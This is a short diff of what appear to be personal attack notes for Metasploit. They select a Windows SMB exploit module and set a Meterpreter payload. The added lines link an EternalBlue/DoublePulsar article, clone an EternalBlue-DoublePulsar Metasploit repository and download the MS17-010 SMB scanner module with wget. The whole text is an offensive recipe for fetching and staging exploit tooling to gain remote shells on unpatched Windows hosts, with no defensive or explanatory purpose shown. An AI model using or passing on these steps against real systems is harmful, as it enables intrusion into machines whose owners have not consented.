@@ -6,3 +6,8 @@ use
 hosts
 use exploit/windows/smb
 set PAYLOAD windows/meterpreter/
+
+#########################
+https://gbhackers.com/windows-eternalblue-doublepulsar/
+git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
+wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/auxiliary/scanner/smb/smb_ms17_010.rb
